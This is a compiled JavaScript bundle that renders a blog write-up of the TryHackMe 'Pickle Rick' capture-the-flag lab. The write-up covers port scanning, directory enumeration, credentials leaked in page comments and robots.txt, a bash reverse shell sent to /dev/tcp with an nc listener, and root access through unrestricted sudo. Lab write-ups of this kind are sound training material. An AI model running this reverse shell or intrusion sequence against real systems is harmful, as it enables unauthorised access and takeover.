"use strict";(globalThis.webpackChunkmy_own_blog=globalThis.webpackChunkmy_own_blog||[]).push([[7595],{28453:(e,n,t)=>{t.d(n,{R:()=>c,x:()=>a});var r=t(96540);const s={},i=r.createContext(s);function c(e){const n=r.useContext(i);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:c(e.components),r.createElement(i.Provider,{value:n},e.children)}},34974:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>a,default:()=>h,frontMatter:()=>c,metadata:()=>r,toc:()=>d});const r=JSON.parse('{"id":"try-hack-me/pickle-rick/pickle-rick","title":"Pickle Rick","description":"- Description: A Rick and Morty CTF. Help turn Rick back into a human!","source":"@site/docs/try-hack-me/pickle-rick/pickle-rick.mdx","sourceDirName":"try-hack-me/pickle-rick","slug":"/try-hack-me/pickle-rick/","permalink":"/docs/try-hack-me/pickle-rick/","draft":false,"unlisted":false,"tags":[{"inline":false,"label":"Web","permalink":"/docs/tags/web","description":"Includes write-ups on the topic of Web"},{"inline":false,"label":"Linux","permalink":"/docs/tags/linux","description":"Includes write-ups on the topic of Linux"}],"version":"current","frontMatter":{"tags":["web","linux"]},"sidebar":"writeupsSidebar","previous":{"title":"GitLab CVE-2023-7028","permalink":"/docs/try-hack-me/gitlab-cve-2023-7028/"},"next":{"title":"RootMe","permalink":"/docs/try-hack-me/rootme/"}}');var s=t(74848),i=t(28453);const c={tags:["web","linux"]},a="Pickle Rick",o={},d=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2}];function l(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"pickle-rick",children:"Pickle Rick"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Description:"})," A Rick and Morty CTF. Help turn Rick back into a human!"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Difficulty:"})," Easy"]}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,s.jsx)(n.p,{children:"With the discovered IP address, I started scanning with Nmap and found that only two ports were open."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"> nmap -p- -sV --min-rate 5000  10.64.184.238\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\r\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Accessing ",(0,s.jsx)(n.code,{children:"http://<IP-address>:80/"})," revealed a simple webpage."]}),"\n",(0,s.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,s.jsx)("img",{src:t(63149).A,style:{width:"100%",height:"auto"}})}),"\n",(0,s.jsxs)(n.p,{children:["There were references to Burp in the content, so I inspected the traffic using Burp Suite.\r\nIn the HTTP response, a commented username was discovered: ",(0,s.jsx)(n.code,{children:"R1ckRul3s"}),"."]}),"\n",(0,s.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,s.jsx)("img",{src:t(95537).A,style:{width:"100%",height:"auto"}})}),"\n",(0,s.jsxs)(n.p,{children:["Next, I used ",(0,s.jsx)(n.code,{children:"gobuster"})," to enumerate directories."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"> gobuster dir -u http://10.64.184.238/ -w /usr/share/wordlists/dirb/common.txt\r\n===============================================================\r\nGobuster v3.8\r\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\r\n===============================================================\r\n[+] Url:                     http://10.64.184.238/\r\n[+] Method:                  GET\r\n[+] Threads:                 10\r\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\r\n[+] Negative Status codes:   404\r\n[+] User Agent:              gobuster/3.8\r\n[+] Timeout:                 10s\r\n===============================================================\r\nStarting gobuster in directory enumeration mode\r\n===============================================================\r\n/.hta                 (Status: 403) [Size: 278]\r\n/.htaccess            (Status: 403) [Size: 278]\r\n/.htpasswd            (Status: 403) [Size: 278]\r\n/assets               (Status: 301) [Size: 315] [--\x3e http://10.64.184.238/assets/]\r\n/index.html           (Status: 200) [Size: 1062]\r\n/robots.txt           (Status: 200) [Size: 17]\r\n/server-status        (Status: 403) [Size: 278]\r\nProgress: 4613 / 4613 (100.00%)\r\n===============================================================\r\nFinished\r\n===============================================================\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Checking ",(0,s.jsx)(n.code,{children:"/robots.txt"})," revealed a string that looked like a password:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"> curl http://10.64.184.238/robots.txt                                                                        \r\nWubbalubbadubdub\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Since this looked promising, I continued enumeration with ",(0,s.jsx)(n.code,{children:"gobuster"})," using PHP extension scanning to locate a login page."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"> gobuster dir -u http://10.64.184.238/ -w /usr/share/wordlists/dirb/common.txt -x php -t 50 -e \r\n===============================================================\r\nGobuster v3.8\r\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\r\n===============================================================\r\n[+] Url:                     http://10.64.184.238/\r\n[+] Method:                  GET\r\n[+] Threads:                 50\r\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\r\n[+] Negative Status codes:   404\r\n[+] User Agent:              gobuster/3.8\r\n[+] Extensions:              php\r\n[+] Expanded:                true\r\n[+] Timeout:                 10s\r\n===============================================================\r\nStarting gobuster in directory enumeration mode\r\n===============================================================\r\n/.hta.php.hta.php             (Status: 403) [Size: 278]\r\n/.htaccess.htaccess            (Status: 403) [Size: 278]\r\n/.htaccess.php.htaccess.php        (Status: 403) [Size: 278]\r\n/.htpasswd.htpasswd            (Status: 403) [Size: 278]\r\n/.hta.hta                 (Status: 403) [Size: 278]\r\n/.htpasswd.php.htpasswd.php        (Status: 403) [Size: 278]\r\n/assetsassets               (Status: 301) [Size: 315] [--\x3e http://10.64.184.238/assets/]\r\n/denied.phpdenied.php           (Status: 302) [Size: 0] [--\x3e /login.php]\r\n/index.htmlindex.html           (Status: 200) [Size: 1062]\r\n/login.phplogin.php            (Status: 200) [Size: 882]\r\n/portal.phpportal.php           (Status: 302) [Size: 0] [--\x3e /login.php]\r\n/robots.txtrobots.txt           (Status: 200) [Size: 17]\r\n/server-statusserver-status        (Status: 403) [Size: 278]\r\nProgress: 9226 / 9226 (100.00%)\r\n===============================================================\r\nFinished\r\n===============================================================\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Navigating to ",(0,s.jsx)(n.code,{children:"/login.php"}),", I found a login form.\r\nUsing ",(0,s.jsx)(n.code,{children:"R1ckRul3s:Wubbalubbadubdub"}),", I successfully authenticated and was redirected to a command execution page."]}),"\n",(0,s.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,s.jsx)("img",{src:t(59323).A,style:{width:"100%",height:"auto"}})}),"\n",(0,s.jsxs)(n.p,{children:["Running ",(0,s.jsx)(n.code,{children:"ls"})," from the web shell returned:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Sup3rS3cretPickl3Ingred.txt\r\nassets\r\nclue.txt\r\ndenied.php\r\nindex.html\r\nlogin.php\r\nportal.php\r\nrobots.txt\n"})}),"\n",(0,s.jsx)(n.p,{children:"However, the system blocked execution when trying to read files like:"}),"\n",(0,s.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,s.jsx)("img",{src:t(71305).A,style:{width:"100%",height:"auto"}})}),"\n",(0,s.jsxs)(n.p,{children:["Since direct file access wasn't possible, I attempted to spawn a reverse shell.\r\nUsing a payload from ",(0,s.jsx)(n.a,{href:"https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet",children:"PentestMonkey"}),", I executed:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"bash -c 'bash -i >& /dev/tcp/<IP-address>/1234 0>&1'\n"})}),"\n",(0,s.jsx)(n.p,{children:"Listener setup:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"nc -lvnp 1234\n"})}),"\n",(0,s.jsx)(n.p,{children:"After sending the payload, I gained a shell:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"> nc -lvnp 1234                              \r\nlistening on [any] 1234 ...\r\n\r\nconnect to [192.168.141.43] from (UNKNOWN) [10.64.184.238] 54444\r\nbash: cannot set terminal process group (1010): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\nwww-data@ip-10-64-184-238:/var/www/html$ \r\nwww-data@ip-10-64-184-238:/var/www/html$ whoami\r\nwhoami\r\nwww-data\n"})}),"\n",(0,s.jsx)(n.p,{children:"Now I could finally read the hidden file:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"www-data@ip-10-64-184-238:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt\r\ncat Sup3rS3cretPickl3Ingred.txt\r\nmr. meeseek hair\n"})}),"\n",(0,s.jsx)(n.p,{children:"Moving to Rick's home directory:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"www-data@ip-10-64-184-238:/home/rick$ cat 'second ingredients'\r\ncat 'second ingredients'\r\n1 jerry tear\n"})}),"\n",(0,s.jsxs)(n.p,{children:["To escalate privileges, I checked ",(0,s.jsx)(n.code,{children:"sudo"})," rights:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"www-data@ip-10-64-184-238:/home/rick$ sudo -l\r\nsudo -l\r\nMatching Defaults entries for www-data on ip-10-64-184-238:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\r\n\r\nUser www-data may run the following commands on ip-10-64-184-238:\r\n    (ALL) NOPASSWD: ALL\n"})}),"\n",(0,s.jsx)(n.p,{children:"So privilege escalation was trivial:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"www-data@ip-10-64-184-238:/home/rick$ sudo bash\r\nsudo bash\r\nwhoami\r\nroot\n"})}),"\n",(0,s.jsx)(n.p,{children:"Finally, the last ingredient:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"cat /root/3rd.txt\r\n3rd ingredients: fleeb juice\n"})}),"\n",(0,s.jsx)(n.p,{children:"Challenge complete."})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},59323:(e,n,t)=>{t.d(n,{A:()=>r});const r=t.p+"assets/images/portal-d8033f578c703a0b4ce65452807bf199.png"},63149:(e,n,t)=>{t.d(n,{A:()=>r});const r=t.p+"assets/images/dash-b3698efc7275e0bb08157e8272e6a905.png"},71305:(e,n,t)=>{t.d(n,{A:()=>r});const r=t.p+"assets/images/cat-7cc6ec508cad1c9a40d09d52b4e47098.png"},95537:(e,n,t)=>{t.d(n,{A:()=>r});const r=t.p+"assets/images/username-04f565227f45c7677890d3a4ad68d665.png"}}]);